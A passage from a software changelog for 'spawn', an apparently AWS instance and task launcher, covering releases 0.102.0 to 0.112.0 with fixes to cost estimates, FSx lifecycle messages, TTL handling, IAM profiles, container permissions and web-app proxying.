  unconditionally — a filesystem in `CREATING` has none of them, and the result was
  a nil-pointer panic and a stack trace instead of a usable answer. FSx Lustre takes
  minutes to provision, and that window is exactly where #613 was reported from. A
  not-yet-ready filesystem is now reported as such: no DNS name and no mount name
  means a mount cannot be built yet, which is the honest answer. A tag with a
  missing key or value had the same crash shape and is fixed with it.
- **`spawn fsx info` no longer overstates storage cost by ~52%** (#619). It
  multiplied capacity by a hardcoded `$0.22/GiB-month` labelled "for SSD" — a
  PERSISTENT_1 rate, applied to the PERSISTENT_2 filesystems `spawn` actually
  creates, whose rate at the default 125 MB/s/TiB tier is `$0.145`. For a 1200 GiB
  filesystem (the FSx Lustre minimum) that reported ~`$264`/month against a real
  ~`$174`. Since v0.112.0 taught `--estimate-only` to quote storage cost, the two
  commands also disagreed about the same filesystem. `fsx info` now reads the
  filesystem's real throughput tier and uses the single shared rate table, labels
  the figure as approximate, and says "unknown" rather than `$0.00` when capacity
  isn't reported yet.

## [0.112.0] - 2026-09-30

### Fixed
- **The sweep cost estimate no longer understates GPU sweeps by 4-12x**
  (spore-host/libs#29). `--estimate-only` and the pre-launch preview priced each
  row from `libs/pricing`'s static table, which has no GPU family newer than
  `p4d` and quietly answered for the ones it didn't know with a per-family-size
  guess — `$2.40/hr` for a `g6e.12xlarge` against a real `$10.49`, and a
  confident `$0.20/hr` for instance types that **do not exist**. Rows are now
  priced through truffle (live AWS Price List, degrading to truffle's own
  exact-match table), and a row that cannot be priced is **named and excluded**
  instead of invented.
- **`--budget` can no longer pass a sweep it hasn't actually priced.** A real
  4-row sweep that previously reported `$10.34` and `✓ Within budget: $9.66
  remaining of $20.00` now reports a `$42.31` floor and warns that it exceeds the
  budget by `$22.31`. Where the total is under budget but incomplete, the preview
  says it *cannot confirm* the sweep is within budget rather than printing a pass
  it did not earn.

### Changed
- **The sweep estimate says where its prices came from**, matching what the
  single-instance launch path already did (#543): a `N instance shape(s) priced:
  N live, M static fallback` line, plus an explicit list of rows that could not
  be priced and a total labelled **FLOOR** when any row is missing from it.
  Lookups are memoized per instance shape, so a 500-row sweep over three shapes
  makes three pricing calls.
- `--estimate-only` on the sweep path now performs read-only AWS Price List
  lookups where it previously worked purely offline. It still launches nothing and
  still completes without usable credentials — it reports rows it could not price
  instead of fabricating them.

## [0.111.4] - 2026-09-26

### Fixed
- **`--fsx-lifecycle ephemeral` no longer claims the filesystem is "reaped when
  this instance terminates"** (#613). Nothing reaps an FSx at terminate time:
  `spawn terminate` destroys the instance and never touches the filesystem.
  Reclamation is **asynchronous** — an out-of-band reaper deletes the filesystem
  on a later pass, once it has finished creating and no live instance still
  references it, after a grace period, and only in accounts that reaper is
  configured to scan. A user who read the old help, ran `spawn terminate`, and saw
  it succeed reasonably concluded a 1.2 TiB (~$174/month) filesystem was gone. It
  wasn't, and it kept billing. The flag help, the `--fsx-create`/`--fsx-ttl`
  validation errors, and `docs/durable-storage-fsx.md` now describe when
  reclamation actually happens, and a test fails if the friendlier, false sentence
  comes back.

### Added
- **`spawn terminate` now names the FSx filesystem the instance was holding** —
  its id, size and state — and says plainly that terminating does **not** delete
  it, with the two commands that settle the question: `spawn fsx list` to confirm,
  `spawn fsx delete <fs-id>` to remove it now (#613). It reports a filesystem that
  is still *provisioning* (the `spawn:fsx-pending` lease) as well as a mounted one,
  since that is the window in which the surprise is easiest to hit, and it does not
  pretend to own a filesystem you brought yourself with `--fsx-id`. The notice is
  informational only: terminate still deletes nothing but the instance.
  `spawn stop`/`hibernate` print the same filesystem with the point that matters
  there — stopping the instance ends the compute bill but the filesystem keeps
  running and keeps billing.
- **`--estimate-only` now includes the filesystem `--fsx-create` would create**
  (#613): capacity, throughput tier, and an approximate monthly cost, plus the
  limitation stated where you'll actually read it — **`--cost-limit` does not cover
  storage**, it caps compute spend only. Previously the preview for a launch about
  to create a ~$174/month filesystem showed a TTL cost of $0.80 and no mention of
  the filesystem at all.

## [0.111.3] - 2026-09-25

### Fixed
- **`task run --wait` no longer reports the *previous* attempt's result when you
  re-run the same `task_id`** (#608). Fix a spec, re-run it, and `--wait` could
  answer with the earlier run's verdict — `failed 141` with the old timestamps —
  while the new instance was still running and going on to succeed. The natural
  read is "my fix didn't work", so the reporter re-debugged working code twice in
  one session; re-running after a fix is the single most common reason to use
  `--wait`, which is exactly when a leftover record exists. Both runs wrote the
  same `tasks/<task_id>/completion.json` key and the record carried no attempt
  identity, so attempt N was indistinguishable from attempt N−1. Now the previous
  attempt's `completion.json` and `.exitcode` are **cleared at launch**, and every
  run stamps a **`run_id`** into its completion record so a leftover record is
  detectable rather than plausible: `--wait` ignores any record that isn't from
  the run it just launched and keeps waiting, printing the run id it launched with
  and saying out loud when it skips an older one. The S3 key is unchanged — the
  workflow adapters that poll it see only an extra, ignorable JSON field, and a
  record written by an older on-instance wrapper (no `run_id`) is still accepted,
  with a warning that it can't be attributed to this run.

## [0.111.2] - 2026-09-25

### Fixed
- **A task asking for 16 vCPUs no longer gets a 64-vCPU instance when the sizes
  cost the same** (#610). `task run` sizes to the cheapest type that fits, and on
  a price **tie** it now prefers the **smallest** type that fits (vCPUs, then
  memory) instead of falling back to the instance-type *name*. The name comparison
  was lexicographic and therefore arbitrary: on `hpc7g` — where every size is the
  same price because you rent the socket, not the cores — `hpc7g.16xlarge` sorted
  ahead of `hpc7g.4xlarge` purely because `'1' < '4'`, so a 16-vCPU request was
  answered with 64 vCPUs. (It was never a "prefers the biggest" bug: on a family
  sized 2x/4x/8xlarge the same comparison picked the smallest and looked correct,
  which is why it went unnoticed.) On `hpc7g` the bill was unchanged, but the same
  tie-break would have over-provisioned at cost on any family with genuinely
  equal-priced sizes.

### Documentation
- **`spawn task run --help` now documents how to choose the instance type
  yourself** (#610). `resources.instance_type` has pinned an exact type since
  #413 — it short-circuits candidate search and price ranking entirely — but it was
  described only in internal design docs, so the one user who needed it (sweeping
  three equal-spec `hpc7g` sizes, which `cpu`/`memory_gib` cannot distinguish)
  concluded it didn't exist. The help text now covers the pin, the price-tie rule
  above, and how `resources.families` differs from pinning.

## [0.111.1] - 2026-09-17

### Fixed
- **`task run` on a GPU instance now actually gives the container a GPU** (#606).
  A task sized onto a GPU family (e.g. `families: ["g5"]`) booted on the GPU DLAMI
  but the wrapper only added `docker run --gpus all` when `resources.gpus` was
  explicitly set — so the common "just pick a g5" spec ran the container with **no
  GPU**, and `nvidia-smi` failed with `command not found` (exit 127). `--gpus all`
  is now passed whenever the *resolved* instance is GPU-capable (same detection
  that selects the GPU DLAMI), not only when `gpus` is set. The wrapper also
  installs + `nvidia-ctk runtime configure`s the NVIDIA Container Toolkit for GPU
  runs (idempotent — a DLAMI that already ships it is just re-configured), so
  `--gpus all` reliably attaches the driver. Validated on a real g5.xlarge:
  `nvidia-smi` now reports the A10G inside the container (exit 0).

## [0.111.0] - 2026-09-16

### Fixed
- **`task run` now targets a GPU AMI for GPU-sized instances, with a TaskSpec/CLI
  AMI override** (#601). When the sizer picks a GPU family (g5, g6, p4/p5, …), the
  launch resolves the AL2023 NVIDIA DLAMI (via `launcher.Provision` →
  `GetRecommendedAMI`) so `docker run --gpus all` lands on a host with a driver
  instead of the driverless default AL2023 — the `task run` analog of the launch
  path's #356/#384. Pin a specific AMI with the new `spawn task run --ami` flag or
  `placement.ami` in the spec (an explicit AMI always wins over auto-selection).
  The `--dry-run` preview now shows the AMI it will launch (GPU DLAMI, standard
  AL2023, or the explicit pin), so a GPU spec's driver AMI is visible before launch
  rather than surfacing as a runtime NVML failure inside the container.

## [0.110.0] - 2026-09-15

### Added
- **Built-in `openrefine` web app** — `spawn app launch openrefine` runs OpenRefine
  (via libs v0.49.0), gated by spored's :443 proxy token. Completes the built-in
  web trio with `code-server` and `jupyter`. Its image is built from the official
  OpenRefine release in the new `spore-host/app-images` repo (OpenRefine ships no
  canonical image). (spore-host spawn#590)

### Documentation
- **New `docs/bring-your-own-app.md`** — how to run a web app on spawn, including
  the "no official image" case (build one; OpenRefine worked example in
  `spore-host/app-images`) and the three rules for a web-app image. Linked from
  the catalog schema reference.

## [0.109.0] - 2026-09-15

### Added
- **Built-in `jupyter` web app** — `spawn app launch jupyter` runs JupyterLab in
  the browser (via libs v0.48.0's catalog entry), gated by spored's :443 proxy
  token. Joins `code-server` as a built-in web-UI app (spore-host spawn#590).

## [0.108.0] - 2026-09-15

### Added
- **Built-in `code-server` web app** — `spawn app launch code-server` runs VS Code
  in the browser (via libs v0.47.0's catalog entry), gated by spored's :443 proxy
  token. The first built-in web-UI app (spore-host spawn#590).
- **Web apps: container run args + a proxy access-token gate** (#590). A `web`
  catalog entry can now set `args:` (or launch with repeatable `--web-arg`) — the
  args are appended to the container's `docker run`, so images that default to
  binding container-localhost or requiring their own auth (code-server, Jupyter)
  can be told to `--bind-addr 0.0.0.0:<port>` / run auth-less. spored's :443 TLS
  reverse proxy now **gates access with a one-time token** (like the DCV
  `authToken`): the ready URL carries `?spore_token=<t>`, which the proxy
  exchanges for a `Secure; HttpOnly` cookie, then serves the app (WebSockets
  included); requests without it get 403. So a web app is protected regardless of
  its own auth, and running it auth-less internally is safe. Opt out with
  `--no-web-auth` (the app must then provide its own auth). Bumps libs to v0.46.0.

### Fixed
- **`spawn app launch` no longer lists or launches apps that can't actually run**
  (#592). The catalog's legacy `launch_command`-only apps (igv, qgis, fiji, ds9)
  have no container image, and the baked-AMI model a bare `launch_command` relied
  on is retired (#389) — so they can never launch. They were shown as
  "launchable" in `spawn app list`, and `spawn app launch <them>` would spin a
  *doomed* instance that failed at session init (wasted cost). They now show as
  "recipe available" (definitions — bind an image via `--image` or a
  `~/.spawn/catalog.yaml` overlay to launch), and the launch refuses upfront with
  a clear "no image configured" message instead of launching.

### Documentation
- **Documented the `spawn app` application-streaming feature** (#593). The README
  now has a "Launch a GUI or web app" section covering the three launch kinds
  (`application`, `desktop`, `web`), a one-line example each, prerequisites
  (`aws login`, a GPU-instance quota for GPU apps), and what the user sees; the
  `app` command is now listed in the command table. Added
  `docs/catalog-schema.md`, a full reference for every catalog `AppEntry` field
  (including `kind`, `port`/`health_path`, and the optional `base_amis` pin) for
  authoring a catalog entry or a `~/.spawn/catalog.yaml` overlay. Corrected two
  stale in-code references to the retired owned "DCV base AMI" model (the DCV
  server is installed at boot on the SSM-resolved AWS base AMI).

## [0.107.0] - 2026-09-14

### Added
- **Web-UI applications — `spawn app launch` now supports apps that serve their
  own web UI** (Jupyter, code-server, OpenRefine, …) with no DCV (#590). A `web`
  catalog kind (or `--web-port <n>` on an `--image` launch) runs the container
  publishing its HTTP port on localhost; spored probes that port and, once it
  answers, starts a built-in **TLS reverse proxy on :443** (terminating with the
  same wildcard cert the DCV path uses) and writes the `spawn:ready-url`
  (`https://<fqdn>/`). No DCV is installed; idle detection uses the generic
  CPU/network/process path. New flags: `--web-port`, `--health-path`. Named
  failure statuses (`web-not-responding`, `web-proxy-failed`) so a stuck launch
  reports why.
- **`spawn app launch desktop` — a bare Linux desktop session** (#591). For when
  you want a general GUI workspace ("open a terminal and run anything") rather
  than a single-app kiosk: it installs a desktop environment + Amazon DCV at boot
  and streams the whole desktop over DCV, no application container. CPU by default
  (cheaper); pass `--instance-type g6.xlarge` for a GL-accelerated desktop. Built
  on the new catalog `kind` field (libs v0.45.0): `application` (the default;
  today's single-app-over-DCV, and what `dcv: true` means) and `desktop`. (`web`
  is reserved for the upcoming web-UI app kind, #590.)

## [0.106.0] - 2026-09-13

### Fixed
- **`spawn app launch` can now pull its container image.** The `spored-instance-role`
  that the launch provisions granted no ECR actions, so `docker login` succeeded
  (account-wide `GetAuthorizationToken`) but the image pull was denied
  (`ecr:BatchGetImage ... no identity-based policy allows`) — the container never
  started, the DCV session `--init` failed, and the launch timed out waiting for
  the ready URL. The role's policy now grants read-only ECR pull
  (`GetAuthorizationToken`, `BatchCheckLayerAvailability`, `GetDownloadUrlForLayer`,
  `BatchGetImage`); cross-account pulls remain gated by the target repo's own
  policy (#588). Takes effect on the next launch (the role policy is rewritten each
  time).

### Changed
- **`spawn app launch` no longer needs an owned "DCV base AMI"** — it resolves
  the AWS-maintained GPU Deep Learning Base AMI (Amazon Linux 2023; NVIDIA driver
  preinstalled, present in every region) via an SSM public parameter at launch,
  and installs the (free, self-licensing) Amazon DCV server at boot
  (spore-host#286/#389). This removes the per-region base-AMI table that had
  drifted into dangling, unshared, and duplicated IDs — the direct cause of the
  "AuthFailure / no spore-dcv-base AMI in <region>" failures. GUI apps now launch
  in any region, not just where a base AMI happened to be built and shared. An
  app may still set an optional `base_amis:` pin (catalog/overlay) to a custom
  pre-baked image; the boot-time DCV install is idempotent and skips itself when
  DCV is already present. The app root volume defaults to 100 GiB (floored at the
  AMI snapshot size) for the larger DLAMI base plus container images.

## [0.105.0] - 2026-09-09

### Security
- Bumped `google.golang.org/grpc` v1.83.1 → v1.83.2 (root module and the
  `lambda/ttl-reaper` / `lambda/dns-updater` nested modules), fixing
  CVE-2026-84445 (HIGH) — a gRPC-Go xDS-server DoS via crash. Trivy's gate
  started failing on every open PR once its vulnerability DB picked up the CVE,
  independent of any code change. (The previous grpc bump to v1.83.1, itself a
  CVE fix, is what this now supersedes.)

### Added
- `spawn connect --tty` (`-t`, #582): allocates a pseudo-terminal on the SSH
  connection (`ssh -t`), which line-buffers the remote command's stdout so a
  long-running command's progress streams live instead of appearing only when
  it exits — and so nothing buffered is lost if the instance auto-terminates
  (TTL/idle) mid-run. Off by default: a PTY merges stdout and stderr and can
  mangle binary/structured output, so leave it off when piping such output
  through `connect` — the default (block-buffered, separate streams) behavior
  is unchanged.

### Documentation
- `spawn snapshot create --help` and `docs/reference-data-volumes.md` now spell
  out the permissions a snapshot build needs — the EBS-direct actions
  `ebs:StartSnapshot`/`ebs:PutSnapshotBlock`/`ebs:CompleteSnapshot` (plus
  `ec2:DescribeSnapshots`) and read on the source bucket — and note that
  `snapshot create` runs with the *caller's* credentials, not on a spawn-managed
  instance. A stock `spawn launch` instance (running as the shared
  `spored-instance-role`) does NOT have these, so building a snapshot there fails
  with `AccessDenied`; to build in-region from a `spawn launch` instance, pass
  `--iam-policy-file` with a policy granting them (no new flag or standing grant
  needed). Adds a ready-to-edit `examples/iam/snapshot-build-policy.json` (#579).

### Fixed
- `spawn cost <name>` for a single `spawn launch` instance no longer errors with
  a raw DynamoDB `ResourceNotFoundException` (#578). A standalone instance has no
  sweep-orchestration cost record, so `spawn cost` now detects that case and
  reports the instance's compute-cost estimate — its on-demand rate
  (`spawn:price-per-hour`) × runtime, the same figure `spawn status` shows —
  instead of leaking the underlying AWS error. When the identifier is neither a
  known sweep/job-array nor a resolvable instance, it fails with a clear,
  actionable message.
- `spawn extend`'s on-box `spored reload` now SSHes in as the instance's
  resolved login user instead of a hardcoded `ec2-user` (#581). On a non-AL2023
  AMI (e.g. Ubuntu, whose login user is `ubuntu`) the hardcoded user failed with
  `Permission denied (publickey)`, so the reload silently no-op'd and the box
  kept self-terminating at its ORIGINAL TTL — a silent failure on a
  lifecycle-critical operation. The same hardcoded-`ec2-user` defect in the
  other non-interactive spored-over-SSH paths (`spawn config`, `spawn status`,
  `spawn queue status`, and array-member commands) is fixed at the same time;
  all now share one login-user resolver so they can't drift again.

## [0.104.0] - 2026-09-04

### Added
- `spawn launch --dry-run` (alias `--print-config`, #569): resolves the full
  flag/`--config`-plugin/AMI-auto-detection/IAM-tag/user-data pipeline exactly
  as a real launch would, prints the result (table or `-o json`), and exits
  with ZERO AWS mutation — no `RunInstances`, no IAM role/profile create, no
  security group create, no tag write. Reuses the real launch's own
  resolution functions rather than a second implementation, so it can't drift
  from actual launch behavior, and an invalid flag combination fails with the
  same error a real launch would give (it "doubles as a linter"). Not yet
  wired into `--batch-queue`/`--queue-template` or parameter-sweep launches —
  those refuse `--dry-run` explicitly rather than silently falling through to
  a real launch; use `--estimate-only` for a cost preview there.
- `spawn task run`'s generated wrapper now logs a `spawn: [<timestamp>] <phase>`
  line at each real boundary — wrapper start, stage-in start/done, (container
  tasks only) Docker install start/done and image pull start/done, command
  start/exit, stage-out start/done (#571). Previously `completion.json`'s
  `started_at`/`ended_at` were the only two timestamps a task had, so the
  entire interval between them — stage-in, the Docker install, the image
  pull, the user command, and stage-out — was one opaque number with no way
  to tell which part actually cost the time: measured on a real task, a 94s
  command window contained 25s of actual work and ~69s that couldn't be
  attributed to any of the three plausible causes. Deliberately plain text
  on `command.log`'s existing stdout rather than a new structured artifact —
  nothing parses that log today, so the addition can't break a consumer, and
  a log a human can read was the thing missing. The `rc=` on each "done"
  marker is also a diagnostic for #566: it shows how far the wrapper
  actually got before a failure, which was previously invisible whenever a
  task produced no completion record at all.

### Fixed
- `spawn task run`'s container path (`spec.container != ""`) now bind-mounts
  a task's `placement` storage — EFS, FSx for Lustre, and any
  `placement.volumes[]` — into the `docker run`, in addition to genuinely
  mounting it on the host as before. Previously the `docker run -v` list was
  built entirely from the input/output manifest and never consulted
  `placement`, so a containerized task (every task, in the
  aarch.bio/aarch.science one-tool-per-image model) could not see any
  EFS/FSx/volume the boot-time storage script had just mounted for it, even
  though a host-argv task (`container == ""`) saw it for free (#570 sub-issue
  1, the blocking bug). The stage-in `mkdir -p` preamble deliberately does
  NOT also mkdir these placement mount points — they're mounted before this
  wrapper runs, and pre-creating a plain local directory at a not-yet-mounted
  path would risk it being silently shadowed once the real mount lands
  (would have reopened the #564 "mkdir set drifts from mount set" class of
  bug in the opposite direction). Covered by fail-without/pass-with tests
  asserting the mount appears in `docker run -v` and does NOT appear in the
  mkdir loop.
- `TaskSpec.Validate()` now rejects a manifest (`inputs`/`outputs`) entry
  whose S3-side value isn't actually an `s3://...` URI — e.g.
  `{"source": "/efs/refs/GRCh38.fa", "destination": "/tmp/GRCh38.fa"}`, a
  local path on a mounted placement filesystem rather than S3. Previously
  this passed `Validate()` and `--dry-run` cleanly and only failed at
  runtime, after a paid boot, because the wrapper unconditionally emits
  `aws s3 cp` for every manifest entry in both directions (#570 sub-issue 2,
  the cheap fix from the issue's two options — the stretch goal of teaching
  the wrapper to dispatch on scheme and copy a placement-local path directly
  is deferred as a follow-up, not implemented here).
- `Placement.EFSID`/`FSxLustreID` mount points are no longer hardcoded to
  `/efs`/`/fsx` in two independent places. Added optional
  `placement.efs_mount_point` / `placement.fsx_mount_point` TaskSpec fields;
  `cmd/task.go`'s boot-time storage script and the new container-mount logic
  above both resolve the same effective mount point (override, or the
  unchanged `/efs`/`/fsx` default), so they can't drift onto different paths
  for the same spec (#570 sub-issue 3).
- `spawn task run` (and any other headless-launch path through a
  freshly-created scoped IAM instance profile) could fail `RunInstances`
  with a transient `InvalidParameterValue: ... Invalid IAM Instance Profile
  name`, even though `CreateOrGetInstanceProfile` had already confirmed the
  profile via `GetInstanceProfile`. That confirmation only proves IAM
  control-plane visibility; `RunInstances` consumes the profile through
  EC2's own, separately eventually-consistent propagation path, which AWS
  documents and explicitly recommends retrying against. Under parallel task
  launches, one profile could lose that second race even though the other
  concurrent launches (with different scoped profiles) succeeded on
  identical code. `RunInstances` now retries specifically on this
  transient (matched on `InvalidParameterValue` + the "Invalid IAM Instance
  Profile name" message, not on any `InvalidParameterValue`), with a
  bounded 2s/4s/8s backoff; any other error still fails immediately with no
  retry. Safe to retry: tags, the instance record, and any ephemeral FSx
  are all created strictly after `RunInstances` succeeds (#213), so a
  rejected call has created nothing to clean up (#572).

## [0.103.1] - 2026-09-03

### Fixed
- `spawn task run`'s completion record now reflects a lost output: a
  declared output whose stage-out `aws s3 cp` failed used to leave
  `state: completed`, `exit_code: 0`, `retry_class: ""` even though the
  artifact never reached its destination — `OUT_RC` was computed and never
  read. It now fails the task with a new retry class,
  `retry_class: "output_delivery_error"`, distinct from `staging_error`
  because the compute already succeeded and only delivery needs retrying
  (#561).
- `spawn task run`'s wrapper script now explicitly resets `set +e` at the
  top of its own text, instead of relying on the invoking shell to already
  be in default (`+e`) mode. Root-caused and confirmed by reproduction: the
  wrapper is not always run as its own bash process — `pkg/launcher/bootstrap.go`
  concatenates it onto the end of `/tmp/spawn-command.sh`, whose own preamble
  is a literal `set -e`, and executes the combined file as ONE bash
  invocation. Under that inherited `-e`, a failing user command (host or
  containerized) aborted the whole script at the point of failure — before
  `rc=$?` was ever captured — so stage-out, classification, and the
  completion-record write (`completion.json`, `.exitcode`, `SPAWN_COMPLETE`)
  never ran, and the box rode out its full TTL instead of self-terminating
  on failure. This is the confirmed root-cause fix for #566, reproduced with
  an exec-based test that fails without the `set +e` and passes with it.
- `spawn task run`'s container path: a task output whose `source` directory
  wasn't shared with any input (e.g. `outputs: [{source: "/tmp/out/", ...}]`
  with no input under `/tmp/out`) now gets `mkdir -p`'d on the host, as the
  invoking user, before `docker run` starts (#564). Previously the stage-in
  `mkdir -p` loop only covered input destination directories, so an
  output-only directory was left for `docker run -v` to auto-create —
  which Docker does as root, mode 0755, leaving the non-root container
  (running as `--user "$(id -u):$(id -g)"` per #555) unable to write into
  it at all. The mkdir loop now reuses `containerMountDirs`' own output (the
  same set `docker run -v` mounts), so the two lists can't drift apart
  again. `examples/task-spec.json` was checked and does not need a change —
  its output directory (`/work`) is already shared with an input.
- Each staged input is now `chown`'d to the same `"$(id -u):$(id -g)"`
  `docker run --user` uses (#555), right after `aws s3 cp` lands it (#565).
  Host `/tmp` is sticky (mode 1777): unlinking a file there requires owning
  that specific file, not just sharing the directory's uid, so a container
  task that untars a staged archive and then deletes it could hit `EPERM`
  if the file's owner ever diverged from the container's `--user` uid. The
  chown uses `sudo` (the instance user has passwordless sudo) so it can
  actually repair a real mismatch, not just no-op when the uid already
  matches.

## [0.103.0] - 2026-09-03

### Added
- `spawn launch --instance-profile NAME` attaches an existing IAM instance
  profile verbatim, bypassing `--iam-role`/`--iam-policy`/`--iam-policy-file`
  resolution and the `spored-instance-profile` default entirely (#550). Also
  wired into the batch-queue and parameter-sweep launch paths.
- The IAM instance profile spawn actually resolved for a launch is now printed
  in `spawn launch`'s own output (both the TUI success box and `-o json`), and
  in `spawn task diagnose` — previously the only way to see it was
  `ec2:DescribeInstances` (`spawn list`/`spawn status` already showed it).
- TaskSpec (`spawn task run`'s JSON contract) gained `resources.disk_gib` and
  `lifecycle.cost_limit`, closing two of the four silent-narrowing gaps in
  #556. `resources.disk_gib` wires into the same `aws.LaunchConfig` field
  `spawn launch --volume-size` populates, so a task's root EBS volume can be
  sized beyond the AMI default (8 GiB on AL2023 arm64) without an attached
  reference-data volume. `lifecycle.cost_limit` wires into the same field
  `--cost-limit` populates, enforced through the same truffle-backed real
  on-demand pricing path (#533/#536) — TaskSpec no longer has to express a
  spend ceiling indirectly by shortening the TTL. Both are optional and
  additive: an omitted field leaves today's behavior (AMI-default disk, no
  cost cap) unchanged. `spawn task run --dry-run` now also shows the
  resolved root disk size (explicit or AMI-default) and the cost limit when
  set, plus a note when the sized instance is a known older generation
  (e.g. `a1`/Graviton 1) that an unconstrained `architecture: arm64` request
  can land on.

### Security
- Bumped `golang.org/x/crypto` v0.53.0 → v0.55.0, fixing CVE-2026-56854
  (CRITICAL, `golang.org/x/crypto/ssh`), and `google.golang.org/grpc`
  v1.82.1 → v1.83.1, fixing CVE-2026-84304 (HIGH). In the root module and
  both nested lambda modules, `lambda/ttl-reaper` and `lambda/dns-updater`
  (the latter carried `grpc` only as an untidied indirect dependency, so it
  was missed on the first pass). Trivy's security gate was failing on every
  open PR once its vulnerability DB picked up these CVEs, independent of
  any code change.

### Fixed
- **`spawn task run`'s container path couldn't write into its own staged
  inputs/outputs for any image whose declared `USER` isn't root or uid 1000**
  (#555): stage-in creates each bind-mounted directory as the instance user
  (uid 1000 on AL2023) with the default umask (0755), but `docker run` was
  issued with no `--user`, so the container ran as whatever `USER` the image
  declares. That's not an edge case — it's the default for the **entire
  bioconda/conda-forge container ecosystem** (every image built on
  `mambaorg/micromamba`, which defaults to uid 57439/`mambauser`), so any task
  whose command wrote its output back into a staged directory got `EACCES`,
  surfacing as a mysterious stage-out failure rather than as a permissions
  problem. `docker run` now passes `--user "$(id -u):$(id -g)"` so the
  container always runs as the same uid:gid that owns the staged directories,
  regardless of the image's declared `USER`.
- **`spawn task run`'s TaskSpec parser silently discarded unknown JSON
  fields** (#556): a spec with a misremembered field name (e.g. `cpus`
  instead of `cpu`, or a `disk_gb` key that was never a real field) used to
  parse and validate cleanly, then size a wildly wrong instance with no error
  pointing at the spec — the issue's repro produced a `t4g.nano` for a
  request that meant 8 vCPU / 16 GiB. `pkg/taskproto.ParseSpec` now decodes
  with `json.Decoder.DisallowUnknownFields`, so any field that doesn't match
  the real schema is now a parse error naming the bad key.
- **Two otherwise-identical `spawn launch` invocations could silently resolve
  to different IAM instance profiles** (#550): spawn has two independent
  profile-resolution paths — `CreateOrGetInstanceProfile` (used whenever any
  IAM configuration is passed, including a task/pool-worker's own scoped
  policy) creates/reuses a profile scoped to exactly what was asked for, while
  `SetupSporedIAMRole` (used when NO IAM configuration is passed) always
  returns the same fixed shared `spored-instance-profile`, which carries no
  data-bucket access beyond whatever was separately attached to it. A launch
  that happened to go through the first path got working S3 access; a later,
  outwardly identical launch that went through the second didn't — and the
  workload's first S3 call then 403s minutes into a paid run, deep inside a
  detached provisioning script, reading as a missing object rather than a
  missing permission. The heuristic itself is unchanged (that's a real design
  choice, not a bug, and this fix does not alter it), but it's now documented
  in code at both call sites, and `--instance-profile` lets a caller sidestep
  it entirely when a deterministic choice matters more than convenience.
- **CRITICAL: `spawn instance-config <id> set ttl <duration>` reported full
  success while NOT changing when the instance would terminate, whenever the
  new duration was SHORTER than the current remaining time — and there was no
  other supported way to shorten a TTL at all** (#553). Two tags describe an
  instance's TTL: `spawn:ttl` (a duration string) and `spawn:ttl-deadline`
  (the absolute timestamp `pkg/agent`'s enforcement loop actually reads,
  preferring it over `spawn:ttl` whenever it's present — true for every
  instance a current spawn has ever launched). `config set ttl` wrote only
  `spawn:ttl`, then triggered a reload and printed "TTL changed: X → Y" and a
  checkmark — four success signals — while `spawn:ttl-deadline` sat
  untouched. `spawn extend` was the only command that wrote the deadline, and
  it is monotonic by construction (it always adds to the existing deadline),
  so it could never substitute as a shortening path either. In one incident
  cited in the issue, an over-provisioned 8h TTL on a $7.657/h node
  couldn't be tightened by any supported command; the instance ran ~6.5h
  past the intended ~1.5h of work, costing roughly $50 of idle burn on top of
  $47.15 already lost to the same shape across three prior incidents. A new
  `pkg/ttl` package is now the single place that derives a deadline from a
  TTL duration (`launch_time + ttl`, the same anchor `agent.NewAgent` uses
  when it synthesizes a deadline for a pre-deadline instance) and renders the
  `{spawn:ttl, spawn:ttl-deadline}` tag pair together; `spawn extend` and
  `spored config set ttl` both now go through it instead of each
  reimplementing a subset. Setting a TTL shorter than the remaining time is
  now fully supported and moves the deadline earlier — extend already owns
  "lengthen from here" and is intentionally forward-only, so `config set ttl`
  is the one path meant to tighten an over-provisioned TTL, which is exactly
  what the issue asked for. `config set ttl` also now: refuses outright
  (instead of writing a partial update) when the instance's `spawn:launch-time`
  tag is missing or unparseable, since there is no coherent anchor to compute
  a deadline from without it; supports `0` to disable TTL enforcement
  entirely (deleting `spawn:ttl-deadline`, matching a launch with no `--ttl`)
  rather than silently producing an already-past deadline; and re-reads the
  daemon's actual post-reload config before printing its checkmark, so the
  message reports the deadline that was really enforced, not an echo of the
  input. Finally, `spored config get ttl` now reports the same
  deadline-derived remaining time `spored status` computes, instead of the
  raw `spawn:ttl` tag in isolation — before this, the two commands could (and
  did, in the reported incident) disagree about the same instance at the same
  moment, one describing the tag that had just been written and the other
  the deadline that actually governs termination.
- **An instance could carry `spawn:dns-status=registered` alongside a stale
  `spawn:dns-error` from an earlier failed attempt** (#551): spored's DNS
  registration (`pkg/agent`'s `NewAgent`, which reruns on every `spored
  status`/`reload`/`config` invocation, not just once at boot) recorded its
  outcome via EC2 `CreateTags`, which only ever adds or overwrites tag keys and
  never removes one it isn't given. A transient early failure (`dns-status:
  failed` + `dns-error: <403 detail>`) followed by a later successful retry
  left the stale `dns-error` tag sitting next to the new `dns-status:
  registered` — a live instance could contradict itself, claiming success and
  failure simultaneously. `spawn:dns-error` is now explicitly cleared whenever
  registration succeeds, so the tag pair can never disagree.
- **spored's own DNS-registration failure never appeared in `spawn launch`
  output** (#551): the CLI's SSH-driven DNS registration and spored's
  independent, in-agent registration are two separate attempts against the
  same DNS API, and only the CLI's own failure was ever printed — spored's
  outcome was previously visible only via a later `spawn status` call. `spawn
  launch` now re-reads the instance's tags right after spored has had a chance
  to register (once `spored` is confirmed up) and prints a non-fatal warning
  if spored's own attempt failed too.

## [0.102.0] - 2026-08-30

### Added
- `spawn launch --no-dns` skips DNS registration entirely for a single
  launch, without also skipping the SSH-readiness wait that
  `--wait-for-ssh=false` forces (#549). A CLI flag beats a persisted
  `dns.enabled` config-file setting, matching this repo's existing
  flag-over-config precedence convention (e.g. `--ttl`).

### Fixed
- **`spawn orphans` no longer counts unattached Elastic IPs owned by other
  AWS services** (#500): an EIP with no association but carrying AWS-reserved
  tags such as `aws:cloudformation:stack-id` belongs to another service's
  stack — CloudFormation-managed NAT gateways and Global Accelerator addresses
  look exactly like this — and releasing it breaks that service while the real
  leak stays invisible behind a wall of false positives. Addresses carrying
  `aws:`-reserved tags are now skipped in orphan classification.

- **The root EBS volume size was unreachable on the parameter-sweep launch
  path** (#544): `--volume-size` was registered and read on the single-instance
  launch path (`cmd/launch_config.go`) but never referenced by
  `cmd/launch_sweep.go`, and the param-file equivalent, `volume_size:`, was
  actively **rejected** rather than silently dropped — its error message named
  `--disk-size`, a command-line flag that has never existed anywhere in this
  codebase (#545). Between the two, there was no way to set a sweep row's root
  volume size at all: every row launched at spawn's hardcoded 20 GiB default
  regardless of what the workload needed, the fourth occurrence of this bug
